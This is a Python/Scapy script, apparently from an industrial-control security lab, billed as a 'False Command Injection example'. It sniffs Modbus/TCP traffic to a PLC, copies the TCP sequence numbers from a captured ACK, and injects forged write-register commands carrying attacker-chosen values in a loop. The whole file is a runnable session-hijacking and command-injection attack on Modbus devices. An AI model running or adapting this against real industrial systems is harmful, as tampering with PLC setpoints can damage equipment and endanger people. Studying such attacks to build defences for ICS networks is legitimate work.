from scapy.all import *
from scapy.layers.inet import *

from random import randint
import time
import argparse

from modbuspkt import Modbus, ModbusTCP

#old_filter_rule = "src host 10.0.0.201 and dst host 10.0.0.22 and tcp[tcpflags]==tcp-ack"
#filter_rule = "host 10.0.0.201 and host 10.0.0.22"

#modbus_string = "x00\\x00\\x00\\x06\\x03\\x06\\x00\\x02"
modbus_string = "x00\\x00\\x00\\x06\\x02\\x06\\x00\\x14"

n_packets = 6
n_captures = 0
n_injected = 0

print()
print("        _____  ______ ___    _____ _____")
print("       / ___/ / ____//   |  / ___// ___/")
print("       \__ \ / /    / /| |  \__ \ \__ \ ")
print("      ___/ // /___ / ___ | ___/ /___/ / ")
print("     /____/ \____//_/  |_|/____//____/  ")
print("                                        ")
print("     False Command Injection example    ")
print()

parser = argparse.ArgumentParser()
parser.add_argument('--target', type=str, required=True)
parser.add_argument('--value', type=int, required=True)
args = parser.parse_args()

target = args.target
value = args.value

print(" target: " + target)
print(" value: " + str(value))
print()

while True:
    # cattura un tcp ack diretto verso il plc
    
    n_captures = n_captures+1
   # print(" packets group #" + str(counter))
   # mb_list = sniff(iface="eth1", lfilter=lambda pkt: IP in pkt and Raw in pkt and pkt[IP].dst=="10.0.0.201" and modbus_string in str(pkt[Raw].load), count=1)
   # ack_list = sniff(iface="eth1", filter="dst host 10.0.0.22 and tcp[tcpflags]&tcp-ack!=0", count=1)

    print(" capture #" + str(n_captures), end='\r')
    pkt_list = sniff(iface="eth1", filter="tcp port 502", count=n_packets)
    
    try: 
        output = [index for index, packet in enumerate(pkt_list) if packet[IP].dst==target and modbus_string in str(packet[Raw].load)]
    except:
        output = []

    if len(output)>0:                           # se nel gruppo di pacchetti sono state identificate modbus response
        mb_index = output[len(output)-1]

        if mb_index < n_packets-2:                        # e se è stato identificato anche l'ACK TCP alla modbus response
        
            n_injected = n_injected+1

            mb = pkt_list[mb_index]
            ack = pkt_list[mb_index+2]

            print()
            print("     modbus response and ack tcp identified, packet forgery")

            tcpdata = {
               'src': ack[IP].src,
               'dst': ack[IP].dst,
               'sport': ack[TCP].sport,
               'dport': ack[TCP].dport,
               'seq': ack[TCP].seq,
               'ack': ack[TCP].ack,
               'wnd': ack[TCP].window,
            }

            payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
        	               TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], \
        	               flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])            
            payload = payload/ModbusTCP(transaction_id=2023, protocol_id=0, length=6, unit_id=2)/ \
                        Modbus(function_code=6, reference_number=20, data=round(randint(value-5000, value+5000),-3))

            print("     packet injection #" + str(n_injected))
            send(payload, verbose=0, iface="eth1")
            print("     done")

            time.sleep(2)


   # mb = mb_list[0]
   # ack = ack_list[0]

   # mb.show()
   # ack.show()

    # genera il pacchetto
   # print(" ----- Packet forgery -----")
   # tcpdata = {
   #    'src': ack[IP].src,
   #    'dst': ack[IP].dst,
   #    'sport': ack[TCP].sport,
   #    'dport': ack[TCP].dport,
   #    'seq': ack[TCP].seq,
   #    'ack': ack[TCP].ack,
   #    'wnd': ack[TCP].window,
   # }
   #
   # payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
   #         	TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], \
   #         	flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])            
   # payload = payload/ModbusTCP(transaction_id=2023, protocol_id=0, length=6, unit_id=2)/Modbus(function_code=6, reference_number=20, data=randint(10000,12000))

   # #print("     displaying packet")

   # # inietta il pacchetto nella rete
   # print(" ----- Packet injection -----")
   # send(payload, verbose=0, iface="eth1")
   # print(" ----- Done ----- ")
   # payload.display()
   # print()

   # time.sleep(10)